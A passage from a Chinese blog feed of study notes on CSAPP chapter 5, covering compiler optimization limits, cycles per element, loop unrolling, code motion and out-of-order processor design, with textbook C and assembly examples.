也可以做成这个样子</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%BB%E6%88%90%E6%B8%B8%E6%88%8F.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%BB%E6%88%90%E6%B8%B8%E6%88%8F2.png"></p><blockquote><p>总经理办公室比其他房间都大，我闺闺是万恶的大资本家！</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP，DRAM，高速缓存</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第五章 优化程序性能</title>
    <link href="/2023/11/19/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/"/>
    <url>/2023/11/19/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<p>程序猿也适用的优化性能小技巧</p><span id="more"></span><h1 id="优化编译器的能力和局限性"><a href="#优化编译器的能力和局限性" class="headerlink" title="优化编译器的能力和局限性"></a>优化编译器的能力和局限性</h1><p>大多数的编译器都向用户提供了一些对他们所使用的优化的控制，最简单的控制就是<strong>优化级别</strong>。</p><p>例如命令行选项 <code>&quot;-Og&quot;</code> 调用 GCC 会让它使用一组基本的优化，以选项 <code>&quot;-01&quot;</code> 或更高调用 GCC 会让它使用更大量的优化。这样做可以提高程序的性能，但是也可能会增加程序的规模。</p><p>除此之外我们需要注意<strong>优化的安全性</strong>，也就是说优化前后成功内需不能有任何编译者目的之外的功能。</p><p>我们来看下面的两个过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">twiddle1</span><span class="hljs-params">(<span class="hljs-type">long</span> *xp,<span class="hljs-type">long</span> *yp)</span><br>&#123;<br>    *xp += *yp;<br>    *xp += *yp;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">twiddle2</span><span class="hljs-params">(<span class="hljs-type">long</span> *xp,<span class="hljs-type">long</span> *yp)</span><br>&#123;<br>    *xp += <span class="hljs-number">2</span>* *yp;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面两个函数的功能都是将存储在指针 yp 位置的值两次加到 xp 知识的位置的值。但是函数 <code>twiddle2()</code> 的效率更高，它只要求有三次引用 （读 *xp，读 *yp，写 *xp），而 <code>twiddle1()</code> 需要有六次引用（两次读 *xp，两次读 *yp，两次写 *xp）。</p><p>那我们自然就会认为这两个函数的功能相同且 <code>twiddle2()</code> 更高效，默认编译器会按照 <code>twiddle2()</code> 的方式来编译  <code>twiddle1()</code> ，但实际上并非如此。</p><p>我们必须要考虑到 <code>*xp =*yp</code> ，即两个指针指向同一处的情况来讲，此时两个函数会分别进行下面的计算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//twiddle1，结果是*xp的值增加4倍</span><br>*xp += *xp<br>*xp += *xp<br><span class="hljs-comment">//twiddle2结果是*xp的值增加3倍</span><br>    *xp += <span class="hljs-number">2</span>* *xp<br></code></pre></td></tr></table></figure><blockquote><p>两个指针可能指向同一个内存位置的情况成为内存别名使用</p></blockquote><p>可以看出运算结果是不相同的，而编译器也不知道这个函数如何被调用，所以必须要考虑到两个指针指向同一处内存地址的情况，这就是一个限制优化的因素。</p><p>再看另一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">long</span> <span class="hljs-title function_">f</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">func1</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> f()+f()+f()+f();<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">func2</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>*f();<br>&#125;<br></code></pre></td></tr></table></figure><p>和上面的第一个例子一样，我们第一眼会觉得这两个函数计算的是相同的结果，并且 <code>func2()</code> 比 <code>func1()</code> 更高效，自然会认为编译器会将 <code>func1()</code> 按照 <code>func2()</code> 的风格编译。</p><p>但我们要考虑下面的 f 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> counter=<span class="hljs-number">0</span>;<br><span class="hljs-type">long</span> <span class="hljs-title function_">f</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> counter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们排除它会改变全局程序状态这一行为，特别地，如果全局变量 counter 设置为 0，那么 <code>func1()</code> 会返回0+1+2+3&#x3D;6，而 <code>func2()</code> 返回 4*0&#x3D;0。</p><p>自上可以看出，函数调用也是妨碍优化的因素之一。</p><h1 id="表示程序性能"><a href="#表示程序性能" class="headerlink" title="表示程序性能"></a>表示程序性能</h1><p>我们首先需要引入度量标准——<strong>每元素的周期数 (Cycles Per Element，CPE)</strong> ，作为一种表示程序性能并指导我们改进代码的方法。</p><p>我们知道处理器活动的顺序是由时钟控制的，度量标准指的就是每个指令执行需要多少个时钟周期。</p><p>例如下面的函数 <code>psum1()</code> 和 <code>psum2()</code> 都是计算长度为 n 的向量 <code>a = ⟨ a0, a1, a2, ···, an-1 ⟩</code>的前置和：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Compute prefix sum of vector a */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">psum1</span><span class="hljs-params">(<span class="hljs-type">float</span> a[], <span class="hljs-type">float</span> p[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i; <br>    p[<span class="hljs-number">0</span>] = a[<span class="hljs-number">0</span>]; <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">1</span>; i&lt;n; i++)<br>        p[i] = p[i<span class="hljs-number">-1</span>] + a[i];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">psum2</span><span class="hljs-params">(<span class="hljs-type">float</span> a[], <span class="hljs-type">float</span> p[], <span class="hljs-type">long</span> n)</span><br>&#123;<br>    <span class="hljs-type">long</span> i; <br>    p[<span class="hljs-number">0</span>] = a[<span class="hljs-number">0</span>]; <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; n<span class="hljs-number">-1</span>; i+=<span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">float</span> mid_val = p[i<span class="hljs-number">-1</span>] + a[i]; <br>        p[i]= mid_val; <br>        p[i+<span class="hljs-number">1</span>] =mid_val + a[i+<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-comment">/* For even n, finish remaining element */</span><br>    <span class="hljs-keyword">if</span> (i&lt;n)<br>        p[i] = p[i<span class="hljs-number">-1</span>] + a[i];<br>&#125;<br></code></pre></td></tr></table></figure><p>函数 <code>psum1()</code> 每次迭代计算结果数列的一个元素。函数 <code>psum2()</code> 使用<strong>循环展开</strong>的技术，每次迭代计算两个元素。它们的运行时间可以用一个常数加上一个被处理元素个数成正比的因子描述。下图对两个函数把 n 和周期数进行最小二乘拟合：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%89%8D%E7%BD%AE%E5%92%8C.png"></p><blockquote><p>最小二乘拟合：</p><p>对于数据点的集合，我们利用最小二乘拟合，我们尝试画一条形如 y&#x3D;mx+b 的线，使下面的这个误差度最小<br>$$<br>\sum_{n&#x3D;1}^n (m_ix+b-y_i)^2<br>$$<br>将 E(m,b) 分别对 m 和 b 求导，把两个导数函数设置为0，进行推导就能得出计算 m 和 b 的算法。</p></blockquote><p>我们发现，循环展开的方式可以加快程序效率，减少访存的次数，而访存往往是计算机执行指令时最耗时间的一个指令。</p><p>在 <code>psum1()</code> 中，每次循环要进行读 <code>p[i-1]</code> ，读 <code>a[i]</code>，写 <code>p[i]</code> 三次访存。而在 <code>psum2()</code> 中，我们每次循环有读 <code>p[i-1]</code> ，读 <code>a[i]</code>，读 <code>a[i+1]</code>，写 <code>p[i]</code> ，写 <code>p[i+1]</code>五次访存，但是 <code>psum2()</code> 一次循环的操作数是 <code>psum1()</code> 的两倍，且减少了循环的次数。</p><p>又由于 <code>psum1()</code> 循环次数多，需要更多的条件跳转语句，这样它被 <code>n</code> 影响的就更多了，相比于此， <code>psum2()</code> 就优化了许多。</p><h1 id="程序示例"><a href="#程序示例" class="headerlink" title="程序示例"></a>程序示例</h1><p>我们声明一个向量的数据结构：头部和数据数组</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%90%91%E9%87%8F%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png"></p><p>我们在四个数据类型下面做测试：<code>int</code>，<code>long</code>，<code>float</code>，<code>double</code>。分别对他们进行求和和求积的操作来测试程序的 CPE。</p><p>最后我们得到了这样的结果：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%AF%B9%E6%AF%94%E7%BB%93%E6%9E%9C.png"></p><p>我们可以发现，未经优化的代码效率较低；使用命令行选项 “-O1”，就会进行一些基本的优化。程序员不需要做什么，就会显著地提高程序性。</p><h1 id="消除循环的低效率"><a href="#消除循环的低效率" class="headerlink" title="消除循环的低效率"></a>消除循环的低效率</h1><p>一个很常见的例子，我们想要逐个处理字符串 s 的数据，我们经常会用到 <code>for (int i=0;i&lt;strlen(s);i++)</code> 这样的语句，看上去没有任何的问题，但是我们每次循环中都要去计算一次 <code>strlen(s)</code> 的值。而在运行过程中我们的s是不会变的，<code>strlen(s)</code> 也是一个常数。在循环次数很大的程序中就会由于这个无用的调用增加程序的运行时间。</p><p>优化方法也很简单，就是把 <code>strlen(s)</code> 这条命令移出循环，就会为每次循环过程减少一次计算流程，变成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(s); <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br></code></pre></td></tr></table></figure><p>这样的优化称为<strong>代码移动</strong>，不会对程序造成明显的 CPE 下降的影响，但是会有一定程度上的效率的提升。</p><p>我们利用这个方法把书中5.3节的combine1函数进行优化，接下来的示例也会用这个函数进行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">conbine2</span><span class="hljs-params">(vec_ptr v,<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length=vec_length(v);<br>    *dest=IDENT;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;length;i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v,i,&amp;val);<br>        *dest=*dest OP val;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（类的功能实现代码就不抄了我太懒了）</p><p>我们需要注意<strong>代码移动是不能由编译器来完成的</strong>，因为编译器会想到最差的情况比如字符发生改变或者从非零变成了零，这个问题以编译器的能力是无法处理的，必须由程序员来进行对应的优化。</p><p>由于我们测试时使用的是小数据集，而实际应用中的数据数量是我们所不能估计的，此时就会产生明显的差别。这也反映了编程时的常见问题——一个看上去无足轻重的代码片断有隐藏的渐近低效率（asymptotic inefficiency）。</p><h1 id="减少过程调用"><a href="#减少过程调用" class="headerlink" title="减少过程调用"></a>减少过程调用</h1><p>像我们看到过的那样，过程调用会带来开销，而且妨碍大多数形式的程序优化。</p><p>在 <code>combine()</code> 函数中，每一次循环迭代都会调用一次 <code>get_vec_element()</code> 来获取下一个向量元素。对每个向量引用，这个函数要把向量索引 <code>i</code> 与循环边界做比较，很明显会造成低效率。在处理其它任意的数组访问时，边界检查是个很有用的特性，但是对 <code>combine()</code>  函数代码，所有的引用都是合法的。</p><p>所以我们就可以去掉边界判断来直接访问元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">data_t</span> *<span class="hljs-title function_">get_vec_start</span><span class="hljs-params">(vec_ptr v)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> v-&gt;data;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine3</span><span class="hljs-params">(vec_ptr v，<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br><span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br>*dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i &lt; length; i++) <br>    &#123;<br>        *dest = *dest OP data[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试后令我们意外的是效率并没有明显的提升。但是我们先保留这个优化，将它视作一个优化方式的其中一步，有许多步骤组合将使程序的性能有明显的提升。</p><h1 id="消除不必要的内存引用"><a href="#消除不必要的内存引用" class="headerlink" title="消除不必要的内存引用"></a>消除不必要的内存引用</h1><p>在 <code>combine3()</code> 中，我们每次循环都会调用指针来访问内存。例如 <code>*dest = *dest OP data[i];</code>，这部分的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L17<br>vmovsd (%rbx), %xmm0<br>vmulsd (%rbx), %xmm0,%xmm0<br>vmovsd %xmm0, (%rbx)<br>addq $8,%rdx<br>cmp %rax, %rdx<br>jne .L17<br></code></pre></td></tr></table></figure><p>我们可以看到，指针 dest 被存储在 rdx 中，我们每次都要先从内存读出再写入内存。但实际上这个数据是不变的，每次迭代开始的 dest 指向的数值就是最后写入的值。</p><p>我们就可以优化这部分内容，消除不必要的内存读写。我们构造一个临时变量来存储累计计算出来的值，循环开始时读取内存，循环结束时再执行内存的写操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">combine4</span><span class="hljs-params">(vec_ptr v，<span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br><span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);<br><span class="hljs-type">data_t</span> acc = IDENT;<br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i &lt; length; i++) <br>    &#123;<br>        acc = acc OP data[i];<br>    &#125;<br>    *dest=acc;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%B6%88%E9%99%A4%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%86%85%E5%AD%98%E5%BC%95%E7%94%A8.png"></p><p>测试结果乐意看出这个优化让我们的效率有了很大的提升。同过程调用一样，这个优化部分也需要程序员来进行。</p><p>当我们用命令行选项 “-O2” 来编译 <code>combine3()</code> ，我们发现性能远远优于使用 “-O1” 。此时得到的性能与我们刚才优化后的 <code>combine4()</code> 相当，但是整数的计算仍低于  <code>combine4()</code> 。我们对比一下O1、O2的汇编代码来探索一下原因：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-O2%E6%B1%87%E7%BC%96.png"></p><p>我们发现O2的优化中将 <code>vmovsd (%rbx), %xmm0</code> 这句内存读取的指令优化掉了，也就相当于设定了一个临时变量。编译器为了防止和源程序有差异，还是会每次循环更新 dest 的值的，所以说这里的优化接近 <code>combine4()</code>，但是和 <code>combine4()</code> 有差距。</p><h1 id="理解现代处理器"><a href="#理解现代处理器" class="headerlink" title="理解现代处理器"></a>理解现代处理器</h1><p>除了编译上的优化，我们还需要考虑利用处理器微体系结构的优化，也就是处理器用来执行指令的底层系统设计。</p><p>在实际的处理器中，是同时对多条指令求值的，这个现象称为指令级并行。多条指令并行地执行，同时又呈现出一种简单的顺序执行指令的表象。</p><p>以下两种因素限制程序的最大性能：</p><ul><li>延迟界限：当一系列操作必须按照严格顺序执行时，某一条指令开始前，上一条指令必须结束。代码中的数据相关性会限制指令级并行，程序受限于延时界限。</li><li>吞吐量界限：处理器功能单元的原始计算能力，是程序性能的终极限制。</li></ul><h3 id="整体操作"><a href="#整体操作" class="headerlink" title="整体操作"></a>整体操作</h3><p>我们假象的处理器并不严格地基于近期的 Inter 处理器的结构。这些处理器被称作超标量初期里，可以在每个时钟周期执行多个操作，并且是乱序的，也就是指令的顺序不一定要与它们的机器及程序中的顺序一致</p><p>处理器的设计有两个部分：</p><ul><li>指令控制单元 (ICU, instruction controll unit) ：负责从内存中读取指令序列，生成一组基本操作，发送给 EU。</li><li>执行单元 (EU, execution unit) ：每个时钟周期接收多个操作，执行操作。</li></ul><p>下图是现代处理器的一个非常简化的示意图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E7%8E%B0%E4%BB%A3%E5%A4%84%E7%90%86%E5%99%A8.png"></p><p><strong>ICU 从指令高速缓存中读取指令</strong>，指令高速缓存是个特殊的高速存储器，它包含着最近访问的指令。通常 ICU 会在当前正在执行的指令很早前就取指，这样才会有足够的时间编译指令，并把操作发送到 EU。</p><p>程序遇到分支时，有选择分支和不选择分支两种可能。在”取指控制“模块，现代处理器采用<strong>分支预测</strong>的技术，处理器不仅会猜测是否会选择分支，还会预测分支的目标地址。</p><p>在这基础上，程序使用<strong>投机执行</strong>的技术，处理器取出预测的分支会跳到的指令，进行指令译码，在确定分支之前就开始执行。如果之后确定分支预测错误，会将状态重置到分支点，取出并执行另一个方向上的指令，这个步骤会造成性能损耗。</p><p><strong>指令译码</strong>接收程序指令，将他们转换成一组基本操作（微操作），例如两个数相加，从内存读数据，向内存写数据。通常,一条只对寄存器操作的指令会被转换成一个操作，例如 <code>addq %rax, %rdx</code> 将会转换成加法操作；而包括内存引用的指令将转换成多个操作，将内存引用和算术运算分来，例如 <code>addq %rax, 8(%rdx)</code>，将会转换成 3 个步骤：加载，加法，存回。执行单元可以并行执行这类多条指令的不同部分。</p><p>除此之外，ICU中有两个重要的单元：</p><ul><li><strong>功能单元</strong>：EU每个时钟周期可以接收多个来自取指单元的操作，每个功能单元可以执行多种不同的操作。</li><li><strong>退役单元retirement unit</strong>：在队列中记录正在执行的指令的信息，确保乱序执行的结果遵守机器级程序的顺序语义。退役单元控制寄存器的更新，一旦一条指令执行完成，并且<strong>分支预测</strong>的结果被确认为预测正确，那么这条指令可以退役(retire)，对寄存器的更新可以被执行，否则这条指令被清空(flushed)，并且丢弃计算的结果。</li></ul><p>控制操作数在执行单元间传送的最常见的机制称为<strong>寄存器重命名</strong>。对寄存器的更新只有在指令退役时才会执行，在执行单元间传送指令（退役之前）需要用到寄存器重命名机制。</p><blockquote><p>书上的解释看不明白我问了 chatGPT：指令被解码时，处理器会分配一个空闲的物理寄存器，并将该指令中涉及到的逻辑寄存器重定向到这个物理寄存器。这样就可以确保指令之间不会互相干扰，从而提高了指令级并行性（Instruction-Level Parallelism）。</p><p>eg:</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%A4%84%E7%90%86%E5%99%A8%E9%87%8D%E5%91%BD%E5%90%8D.png"></p></blockquote><h3 id="功能单元的性能"><a href="#功能单元的性能" class="headerlink" title="功能单元的性能"></a>功能单元的性能</h3><p>处理器性能由以下几个数值刻画：</p><ul><li>延迟：它表示完成运算所需要的总时间</li><li>发射时间：表示两个连续的同类型的运算之间所需要的总时间</li><li>容量：表示是能够执行该运算的功能单位的数量</li></ul><p>其中，表示发射时间的另一个常见的方法是指明这个功能单位的最大吞吐量，定义为发射时间的倒数。</p><p>算术运算的延迟、发射时间和容量会影响合并函数的性能，我们用 CPE 的值的两个基本界限来描述这种影响：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E5%BB%B6%E8%BF%9F%E7%95%8C%E9%99%90.png"></p><p>延迟界限给出了任何必须按照严格顺序完成合并运算的函数所需要的最小 CPE 值。吞吐量界限给出了 CPE 的最小界限。</p><h3 id="处理器操作的抽象模型"><a href="#处理器操作的抽象模型" class="headerlink" title="处理器操作的抽象模型"></a>处理器操作的抽象模型</h3><p>我们用数据流表示在现在处理器上执行的机器及程序性能，这是一种图形化的表示方法，展现了不同操作之间的数据相关是如何限制它们的执行顺序的。这些限制形成了需要优化的关键路径，这是执行一组机器指令所需时钟周期数的一个下界。</p><p>例如：下图为之前章节中 combine4 函数的图形化表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.L25:<br>vmulsd (%rdx), %xmm0, %xmm0<br>addq $8, %rdx<br>cmpq %rax, %rdx<br>jne .L25<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/5-%E6%95%B0%E6%8D%AE%E6%B5%81.png"></p><p>对于形成循环的代码片段，我们可以将访问到的寄存器分为四类：</p><ul><li>只读：这些寄存器只用作源值，可以作为数据，也可以用来计算内存地址，但是在循环中它们是不会被修改的。</li><li>循环：combine4 的只读寄存器是 %rax。</li><li>只写：这些寄存器作为数据传送操作的目的。在本循环中没有这样的寄存器。</li><li>局部：这些寄存器在循环内部被修改和使用，迭代与迭代之间不相关。在这个循环中，条件码寄存器就是例子，cmp 操作会修改它们， jne 操作又会使用它们，不过这种相关是在<strong>单次迭代</strong>之内的。</li><li>循环：对于循环来说，这些寄存器既作为源值，又作为目的，一次迭代中产生的值会在另一次选代中用到。可以看到，%rdx 和 %xmm0是 comine4 的循环寄存器，对应于程序值 data+i 和 acc。</li></ul><h1 id="优化代码完整示例"><a href="#优化代码完整示例" class="headerlink" title="优化代码完整示例"></a>优化代码完整示例</h1><h3 id="原始代码"><a href="#原始代码" class="headerlink" title="原始代码"></a>原始代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// OP为+时IDENT为0</span><br><span class="hljs-comment">// OP为*时IDENT为1</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine1</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; vec_length(v); i++)<br>    &#123;  <br>        <span class="hljs-comment">// 这里vec_length(v)重复求值了</span><br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v, i, &amp;val);<br>        *dest = *dest OP val;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="消除循环的低效率-1"><a href="#消除循环的低效率-1" class="headerlink" title="消除循环的低效率"></a>消除循环的低效率</h3><p>优化方法称为<strong>代码移动(code motion)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">combine2</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);  <span class="hljs-comment">// 将不变的长度放到循环外</span><br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        get_vec_element(v, i, &amp;val);<br>        *dest = *dest OP val;<br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="减少过程调用-1"><a href="#减少过程调用-1" class="headerlink" title="减少过程调用"></a>减少过程调用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">data_t</span>* <span class="hljs-title function_">get_vec_start</span><span class="hljs-params">(vec_ptr v)</span>&#123;<span class="hljs-keyword">return</span> v-&gt;data;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">combine3</span><span class="hljs-params">(vec_ptr v, <span class="hljs-type">data_t</span> *dest)</span><br>&#123;<br>    <span class="hljs-type">long</span> i;<br>    <span class="hljs-type">long</span> length = vec_length(v);<br>    <span class="hljs-type">data_t</span> *data = get_vec_start(v);  <span class="hljs-comment">// 获取数组起始地址</span><br>    *dest = IDENT;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; length; i++)<br>    &#123;<br>        <span class="hljs-type">data_t</span> val;<br>        *dest = *dest OP data[i];  <span class="hljs-comment">// 将函数调用get_vec_element(v, i, &amp;val)改为内存偏移量</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="消除不必要的内存引用-1"><a 